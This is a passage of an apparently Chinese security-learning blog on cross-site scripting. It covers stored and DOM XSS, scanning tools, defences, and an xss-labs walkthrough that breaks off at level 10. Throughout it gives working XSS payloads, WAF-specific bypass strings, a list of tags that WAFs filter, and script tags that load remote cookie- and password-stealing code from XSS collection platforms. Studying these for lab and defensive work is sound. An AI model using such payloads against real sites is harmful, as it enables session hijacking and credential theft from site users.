XSS（持续型）"></a>存储型 XSS（持续型）</h3><p>过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php &#x3D;&gt; XSS被写入数据库 &#x3D;&gt; 他人访问页面执行index.php &#x3D;&gt; 回包（XSS在前端被执行） </p><p>存储型 XSS 则是<u>把攻击脚本提交到网站 <strong>后台数据库</strong>，只要有人访问了显示该数据内容的页面，就会被攻击</u>。存储型XSS又称持久型XSS，<strong>攻击脚本将被永久地存放在目标服务器的数据库或文件中</strong>，可能存在于一些我们信任的网站，具有很高的隐蔽性。</p><p>攻击方式：这种攻击<u>多见于论坛、博客和留言板</u>，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><p>相对于反射型，存储型的 XSS 成功率更高。</p><p>比如，下面的网站有留言板功能，尝试在 Name框或者Message 框提交弹窗脚本输出当前 cookie，可以构造如下XSS攻击语句<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，网站在回显我的留言时XSS脚本就会在HTML中执行。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728161005216.png" alt="image-20220728161005216"></p><h3 id="DOM-型-XSS（DOM）"><a href="#DOM-型-XSS（DOM）" class="headerlink" title="DOM 型 XSS（DOM）"></a>DOM 型 XSS（DOM）</h3><p>过程：参数x&#x3D;xss 然后发包 &#x3D;&gt; 携带该参数执行本地浏览器前端代码（XSS在前端被执行） （&#x3D;&gt; index.php &#x3D;&gt; 回包）</p><ul><li><p><strong>DOM</strong></p><p>DOM全称Document Object Model，使用DOM可以使程序和脚本能够<strong>动态访问和更新文档的内容、结构及样式</strong>。根据用户在页面的操作或提交的参数，对网页进行动态更新，比如点击查看更多、在页面输入内容后立即回显在页面等。</p><p>HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。 通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节<br>点)均可被修改，也可以创建或删除节点。HTML DOM树结构如图所示。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728165551769.png" alt="image-20220728165551769" style="zoom:67%;"><p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。</p></li><li><p><strong>DOM型XSS</strong></p><p>DOM 型 XSS 是指 <strong>基于DOM文档对象模型</strong> 的 XSS 攻击，攻击的输出点就位于 DOM 对象上，如<code>document.referer</code>、<code>document.write</code>等等，是一种特殊类型的反射型XSS。<strong>由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞<u>不需要与服务器端交互</u>，它<u>只发生在客户端处理数据的阶段</u>。</strong></p><p>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，<u>DOM对象就会处理XSS代码，在本地浏览器前端HTML执行攻击脚本，导致存在XSS漏洞</u>。</p></li><li><p><strong>举例</strong></p><p>比如下面的网站功能是选择一种语言，会以get请求接收参数default，并且在前端回显（会在HTML中用到所提交的参数）。查看页面HTML代码，发现default的值被用于以 <code>document.write</code> 的方式来写入网页，使网页显示所选的language，由此确定页面的XSS方式为DOM型。（对客户端网页进行了访问和更新）</p><p>在 URL 后直接加入攻击脚本 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，即可实现攻击。</p><p>有时需要查看页面HTML源码，考虑闭合语法。比如当使用<code>img</code>标签进行攻击时，攻击脚本应为 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，以闭合select和option标签。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163628648.png" alt="image-20220728163628648"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163440677.png" alt="image-20220728163440677"></p><ul><li><p><strong>防御</strong></p><p>比如用户输入的参数”$var”被用于如下代码，造成DOM型的XSS。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x=<span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27; &gt;test&lt;/a&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为了防御这种XSS，可以采用编码的方法，在”$var” 输出到&lt;script&gt;时，应该执行一次javascriptEncode；其次，在document.write输出到HTML页面时，要分具体情况看待：如果是输出到事件或者脚本，则要再做一次javascriptEncode；如果是输出到HTML内容或者属性，则要做一次HtmlEncode，以免又被自动解码。（<strong>执行两次编码</strong>）</p><p>也就是说，从javascript输出到HTML页面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。</p></li></ul><h2 id="XSS攻击过程"><a href="#XSS攻击过程" class="headerlink" title="XSS攻击过程"></a>XSS攻击过程</h2><ul><li><p>寻找目标网站</p><p>有注册输入栏、留言板之类的网站，能回显输入（也就是会在HTML中用到输入的参数）。</p></li><li><p>尝试提交攻击脚本，探查过滤规则，确定可行的攻击语句</p><p>可以使用自己构造的攻击语句；</p><p>也可以搜索XSS平台，借助XSS平台构造所需要功能的攻击语句。比如xsshs.cn、xss8.cc等。一般平台构造的语句中含有平台的链接，受害者执行攻击脚本中的该链接，导致XSS，然后在XSS平台可以查看到相应的执行结果。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171550607.png" alt="image-20220730171550607"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171634759.png" alt="image-20220730171634759"></p></li><li><p>查看网页元素，确定脚本执行情况</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171933630.png" alt="image-20220730171933630"></p><p>攻击脚本执行成功后，查看XSS平台，获取到浏览器信息，比如cookie。</p><p><img src="https://i0.hdslb.com/bfs/article/a6b01bee60a6cf7ea796d29f3d6a2e7efb2c7a84.png@831w_318h_progressive.webp" alt="img"></p></li><li><p>根据获得的信息进行进一步攻击</p><p>比如是网站的管理员执行了XSS，受到攻击，那么就能获取到管理员的cookie。</p><p>用户凭据：通过凭据可以判断对方身份信息</p><p><strong>cookie</strong>：存储本地，存活时间较长，常用于小中型网站（账号登录）</p><p><strong>session</strong>：会话，存储服务器（占用服务器资源），存活时间较短，常用于大型网站（支付）</p></li></ul><h2 id="XSS自动化工具"><a href="#XSS自动化工具" class="headerlink" title="XSS自动化工具"></a>XSS自动化工具</h2><p><strong>XSStrike</strong></p><p><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><p>XSStrike <strong>主要支持反射和 DOM XSS</strong>，支持扫描；多线程爬虫；Context 分析；可配置的核心；检测和规避 WAF；老旧的 JS 库扫描；智能 payload 生成器；手工制作的 HTML &amp; JavaScript 解析器；强大的 fuzzing 引擎；盲打 XSS 支持；高效的工作流；完整的 HTTP 支持；Bruteforce payloads 支持；Payload 编码。 </p><p>XSStrike常用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-h, --help //显示帮助信息</span><br><span class="line">-u, --url //指定目标 URL</span><br><span class="line">--data //POST 方式提交内容</span><br><span class="line">-v, --verbose //详细输出</span><br><span class="line">-f, --file //加载自定义 paload 字典</span><br><span class="line">-t, --threads //定义线程数</span><br><span class="line">-l, --level //爬行深度</span><br><span class="line">-t, --encode //定义 payload 编码方式</span><br><span class="line">--json //将 POST 数据视为 JSON</span><br><span class="line">--path //测试 URL 路径组件</span><br><span class="line">--seeds //从文件中测试、抓取 URL</span><br><span class="line">--fuzzer //测试过滤器和 Web 应用程序防火墙。</span><br><span class="line">--update //更新</span><br><span class="line">--timeout //设置超时时间（防止cc拦截）</span><br><span class="line">--params //指定参数</span><br><span class="line">--crawl //爬行</span><br><span class="line">--proxy //使用代理</span><br><span class="line">--blind //盲测试</span><br><span class="line">--skip //跳过确认提示</span><br><span class="line">--skip-dom //跳过 DOM 扫描</span><br><span class="line">--headers //提供 HTTP 标头</span><br><span class="line">-d, --delay //设置延迟</span><br></pre></td></tr></table></figure><p>使用流程：</p><ul><li><strong>运行工具</strong></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084135009.png" alt="image-20220801084135009"></p><ul><li><p><strong>fuzzer攻击语句扫描</strong></p><p>确定网站会过滤哪些语句，哪些语句又不会被拦截。</p><p>—offline说明waf是离线的状态，这里是因为该工具为外国开发，识别不到安全狗。</p><p>—passed为没有拦截，filtered为有过滤</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084340700.png" alt="image-20220801084340700"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084529954.png" alt="image-20220801084529954"></p></li><li><p><strong>测试扫描结果</strong></p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084601132.png" alt="image-20220801084601132"></p><ul><li><p><strong>选择攻击语句</strong></p><p>选择一个不会被拦截的XSS攻击语句，</p></li><li><p><strong>在浏览器中进行攻击</strong></p><p>有可能出现请求过于频繁，被网站拦截</p><p>—对于拦截，请求频繁被cc攻击拦截后，重启靶场phpStudy即可</p><p>—实际进行网站测试时，可以现在本地搭建环境，测试那些语句不会拦截在进行漏洞测试</p><p>—还有一种方法：用代理（比较麻烦）</p></li></ul><p><strong>或者直接自动攻击</strong>：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085042713.png" alt="image-20220801085042713"></p><p><strong>配合字典进行fuzz模糊测试：</strong></p><p><strong>xssfuzz在线fuzz工具</strong></p><p><a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a></p><p>用于自动生成各种XSS攻击payload：</p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220731151629014.png" alt="image-20220731151629014" style="zoom:50%;"><p><strong>BP配合fuzzDicts进行攻击：</strong></p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085514970.png" alt="image-20220801085514970"></p><p>name参数作为变量：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085535275.png" alt="image-20220801085535275"></p><p>选择字典文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085627325.png" alt="image-20220801085627325"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085645342.png" alt="image-20220801085645342"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085833954.png" alt="image-20220801085833954"></p><p>不同的执行结果，返回的网页数据包长度会不同，这里数据包更大的表示XSS攻击失败：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085929875.png" alt="image-20220801085929875"></p><p><strong>xwaf</strong></p><p><a href="http://www.freebuf.com/news/127001.html">http://www.freebuf.com/news/127001.html</a></p><p>xwaf是一个python写的waf自动绕过工具。上一个版本是bypass_waf，xwaf相比bypass_waf更智能，可无人干预,自动暴破waf。</p><h2 id="XSS防护建议"><a href="#XSS防护建议" class="headerlink" title="XSS防护建议"></a>XSS防护建议</h2><ul><li><p><strong>代码过滤</strong>（黑名单）</p><p>包括URL、查询关键字、HTTP头、POST 数据等，仅接受指定长度范围、格式适当、符合预期的内容，对其他不符合预期的内容一律进行过滤。</p></li><li><p><strong>HttpOnly</strong></p><p><a href="https://www.oschina.net/question/100267_65116">https://www.oschina.net/question/100267_65116</a></p><p>如果您在cookie中设置了HttpOnly属性，那么 <strong>通过js脚本将无法读取到cookie信息（唯一的作用）</strong>，这样能有效的防止XSS攻击，但是并不能防止xss漏洞，只能是防止cookie被盗取。</p><p>一般除了开启 httponly，还会同时将用户所提供的内容输入输出进行过滤，许多语言都有提供对HTML的过滤。</p><ul><li><p>对于PHP而言：<a href="https://www.zuimoge.com/212.html">https://www.zuimoge.com/212.html</a></p><p>可以在php.ini文件内修改<code>session.cookie_httponly=True</code>，可以在网页php代码中开启<code>ini_set(&quot;session.cookie_httponly&quot;, 1)</code>，还可以在输入输出进行关键字、大小写、特殊符号过滤等等。比如PHP的htmlentities()和htmlspecialchars()这两个函数可以把字符转换为 HTML 实体，使得攻击代码失效。ASP的Server.HTMLEncode()对一段指定的字符串应用 HTML 编码。</p></li><li><p>对于Java而言（ESAPI）：<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p><p>ESAPI是一个Apache开发的安全组件，首先应当配置过滤器（注意在过滤器中chain.doFilter(..)方法中的Request对象进行包装，在包装类中对请求参数进行筛选操作）。其次将过滤器注册到web.xml文件中；最后配置Request的包装类，在其中对请求信息进行过滤。</p><p>可以选择使用CSF(Content Security Policy)安全策略：CSF是一种白名单防御策略，所有不在名单内的资源都不被信任，有效的防止了通过外部的标签、脚本、JS文件等资源的入侵形式。</p></li></ul></li><li><p>WAF</p></li></ul><h2 id="HttpOnly的绕过"><a href="#HttpOnly的绕过" class="headerlink" title="HttpOnly的绕过"></a>HttpOnly的绕过</h2><ul><li><p>若浏览器未保存帐号密码</p><p>利用表单劫持，得到用户输入的账号密码，并抄送到XSS平台上去，再应用到XSS攻击中。</p><p>前提条件1：明文密码；前提条件2：XSS存在于登录框才行，比较鸡肋</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104453015.png" alt="image-20220801104453015"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104215899.png" alt="image-20220801104215899"></p></li><li><p>若浏览器保存帐号密码</p><p>浏览器读取帐号密码。根据表单配置XSS平台，然后写入XSS代码。</p><p>确定注册时的表单属性信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104757064.png" alt="image-20220801104757064"></p><p>在XSS平台创建一个项目，点击配置，选择获取浏览器保存的账号密码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104653286.png" alt="image-20220801104653286"></p><p>按照网站的表单信息填写相应的属性：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104836681.png" alt="image-20220801104836681"></p><p>配置完成后，按照XSS平台提供的攻击语句在浏览器执行攻击，比如<code>&lt;sCRiPt sRC=//xsshs.cn/9TUt&gt;&lt;/sCrIpT&gt;</code>。</p></li></ul><h2 id="常规WAF绕过思路"><a href="#常规WAF绕过思路" class="headerlink" title="常规WAF绕过思路"></a>常规WAF绕过思路</h2><p>常见WAF过滤的标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  &lt;a&gt;  &lt;p&gt;  &lt;img&gt;  &lt;body&gt; &lt;button&gt;  &lt;var&gt;  &lt;div&gt;  &lt;iframe&gt;  &lt;object&gt; &lt;input&gt; </span><br><span class="line">&lt;textarea&gt;  &lt;keygen&gt; &lt;frameset&gt;  &lt;embed&gt;  &lt;svg&gt;  &lt;math&gt;  &lt;video&gt;  &lt;audio&gt; &lt;select&gt;</span><br></pre></td></tr></table></figure><h3 id="黑名单（大小写绕过）"><a href="#黑名单（大小写绕过）" class="headerlink" title="黑名单（大小写绕过）"></a>黑名单（大小写绕过）</h3><p>过滤单引号、双引号、&lt;、&gt;、on开头的单词等非法字符。</p><p>比如过滤script，但是没有考虑大小写：</p><p><code>&lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p><h3 id="删除黑名单字段（重复数据绕过）"><a href="#删除黑名单字段（重复数据绕过）" class="headerlink" title="删除黑名单字段（重复数据绕过）"></a>删除黑名单字段（重复数据绕过）</h3><p>尝试在 <code>&lt;script&gt;</code> 中再嵌套一个 <code>&lt;script&gt;</code>绕过：</p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p><h3 id="特殊符号干扰"><a href="#特殊符号干扰" class="headerlink" title="特殊符号干扰"></a>特殊符号干扰</h3><ul><li><p>引号闭合参数，不要&gt;</p><p>如果对&lt;&gt;进行了过滤，无法使用，可以用引号闭合链接（对于来自XSS平台的含有XSS的恶意链接）。</p><p>比如<code>&lt;script src=&#39;https://xxs8.cc/xxxx&#39;</code>是有可能成功攻击的。</p></li><li><p><code>/</code>干扰</p><p><code>&lt;/img src=&quot;#&quot; onerror=&quot;javascript:alert(1)&quot;sbjkdsbfjeb#&gt;</code></p></li></ul><h3 id="标签语法替换"><a href="#标签语法替换" class="headerlink" title="标签语法替换"></a>标签语法替换</h3><p>使用代码 <code>$name = preg_replace( &#39;/&lt;(.\*)s(.\*)c(.\*)r(.\*)i(.\*)p(.\*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code>，<code>.</code>代表任意字符，<code>*</code>代表匹配前一个字符0或无限次。其中<code>preg_replace</code> 函数可以调用正则表达式，进行 script 的逐字检查，并通过 <code>/i</code> 来不区分大小写。</p><p>但是上述代码只考虑了script标签的XSS，其实 <strong>JS 脚本不仅仅可以在 <code>&lt;script&gt;</code> 标签中使用，通过 <code>&lt;img&gt;</code> 标签中 <code>onerror</code> 行为也可以调用 JS 脚本。</strong></p><p>提交 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，攻击成功。</p><p>也可尝试更多其他标签，比如<code>&lt;a&gt;</code>、<code>&lt;svg&gt;</code>、<code>&lt;audio&gt;</code>等。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728162118390.png" alt="image-20220728162118390"></p><h3 id="字符长度限制绕过"><a href="#字符长度限制绕过" class="headerlink" title="字符长度限制绕过"></a>字符长度限制绕过</h3><p>如果只是在浏览器前端进行的字符长度限制，那么要么禁用或者修改前端的相关JS脚本，要么绕过前端在 Burpsuite 中修改数据包就可以轻松绕过限制。</p><h3 id="提交方式更改"><a href="#提交方式更改" class="headerlink" title="提交方式更改"></a>提交方式更改</h3><p>get不行，换post。</p><p>比如安全狗的部分拦截仅针对URL（get）进行检测。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220731151918996.png" alt="image-20220731151918996"></p><p>更换为post提交后payload成功执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220731152045595.png" alt="image-20220731152045595"></p><p>有时也可以选择 HTTP 头部进行注入：</p><p>Referer表示本网页的上一个URL，这里的攻击语句首先使用引号闭合语法，然后定义type为text，使得alert(1)能够显示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801092502124.png" alt="image-20220801092502124"></p><p>攻击成功，网页上出现弹框：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801092649962.png" alt="image-20220801092649962"></p><h3 id="垃圾数据溢出"><a href="#垃圾数据溢出" class="headerlink" title="垃圾数据溢出"></a>垃圾数据溢出</h3><p>在脚本末尾加上大量无关字符，导致过滤条件失效。注意最后要加上#注释、或者&#x2F;&#x2F;、或者–+，需要自己试（特殊符号干扰）。</p><p>比如<code>&lt;script src=&#39;https://xxs8.cc/xxxx&#39;fhdhbgdioslbdvs#&gt;</code></p><h3 id="编码转换（编码绕过）"><a href="#编码转换（编码绕过）" class="headerlink" title="编码转换（编码绕过）"></a>编码转换（编码绕过）</h3><p>对输入到页面的数据进行编码转换，使得攻击语句的某些特殊字符被编码，攻击失效。</p><p>绕过时，对攻击语句也主动进行编码即可，网站发现这些字符已经被编码，会自动对某些编码进行解码。。</p><p>包括JS编码，HTML实体编码，URL编码。</p><ul><li><p>JS编码</p><p>JS提供了四种编码策略：</p><p>三个八进制数字，如果个数不够，在前面补0，比如”e”的编码为”\145”；</p><p>两个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\x65”；</p><p>四个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\u005”；</p><p>对于一些控制字符，使用特殊的C类型的转义风格。</p></li><li><p>HTML实体编码</p><p>命名实体：以&amp;开头，以分号结尾，例如<code>&lt;</code>的编码是<code>&amp;lt;</code>。</p><p>字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为<code>&amp;#数值;</code>，例如<code>&lt;</code>的编码是<code>&amp;#060;</code>和<code>&amp;#x3c;</code>。</p></li><li><p>URL编码</p><p>由于网页会对URL进行一次解码，所以使用URL编码绕过时有时需要进行两次编码。所以在使用编码测试时，需要考虑HTML的渲染顺序，选择合适的编码方式进行测试。</p></li></ul><p>针对不同的WAF产品，有不同的编码绕过方法：<a href="https://bbs.pediy.com/thread-250852.htm">https://bbs.pediy.com/thread-250852.htm</a></p><p>针对Cloudflare，使用无空格filler绕过：<code>&lt;a&quot;/onclick=(confirm)()&gt;click\</code></p><p>针对Worldfence，使用数字符编码绕过：<code>&lt;a/href=javascript&amp;colon;alert()&gt;click\</code></p><p>针对Barracuda，使用数字符编码绕过：<code>&lt;a/href=&amp;#74;ava%0a%ed%09script&amp;colon;alert()&gt;click\</code></p><p>针对Akamai，使用黑名单中缺少的event handler;混淆函数调用：<code>&lt;d3v/onauxclick-[2]. some(conf irm)&gt;click\</code></p><h3 id="内置函数转义（难绕过）"><a href="#内置函数转义（难绕过）" class="headerlink" title="内置函数转义（难绕过）"></a>内置函数转义（难绕过）</h3><p>使用 <code>htmlspecialchars</code> 函数对提交的信息进行 <strong>转义</strong>。该函数会将所有特殊字符转义为 HTML 实体。比如把 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，把 <code>&gt;</code> 转义为 <code>&amp;gt;</code>。只要正确的使用该函数，XSS 攻击就可以彻底杜绝。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><p>xss-labs通关大合集：</p><p><a href="https://blog.csdn.net/wo41ge/article/details/107459332%E3%80%81">https://blog.csdn.net/wo41ge/article/details/107459332、</a></p><p><a href="https://blog.csdn.net/m0_62879498/article/details/123592092">https://blog.csdn.net/m0_62879498/article/details/123592092</a></p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>所输入name的值会回显在<code>&lt;h2&gt;&lt;/h2&gt;</code>中，因此直接插入script：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述语句是标准模板，后面的关卡均可以先输入上述内容，来判断所使用的防御手段。</p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>中的内容被实体编码了，但在Input中没有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;ccb&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因此在value中插入script，但是注意<code>&quot;&gt;</code>闭合以及注释。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>以及<code>&lt;input&gt;</code>中的内容均被实体编码，无法使用&lt;&gt;。</p><p>因此，使用<code>&lt;input&gt;</code>的特殊事件来触发script，input的&lt;&gt;可以不闭合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#x27; onfocus=javascript:alert(1)//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27; onfocus=javascript:alert(1)//&#x27;&gt;</span><br></pre></td></tr></table></figure><p>输入后，再点击输入框即可出发onfocus事件。</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>第三关的单引号闭合换为双引号。</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>经过尝试，发现script、onfocus、οnmοuseοver 均被注释掉了。使用<code>&lt;a&gt;</code>标签。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>经过尝试，发现script和href均被过滤。使用大小写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p><code>&lt;input&gt;</code>的value值未被实体编码，但是若提交的内容中有script、href会被替换为空。双写绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;ccb&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>引号、&lt;、&gt;均被实体编码，href、script又被过滤，只能使用编码绕过。</p><p>将<code>javascript:alert(1)</code>中的script转化为实体编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>在第8关的基础上，强制输入的内容要带有<code>http://</code>，不然报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(`http://`)</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>页面上没有输入框，检查源码发现有三个<code>&lt;input&gt;</code>，尝试输入发现只有t_sort会回显。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 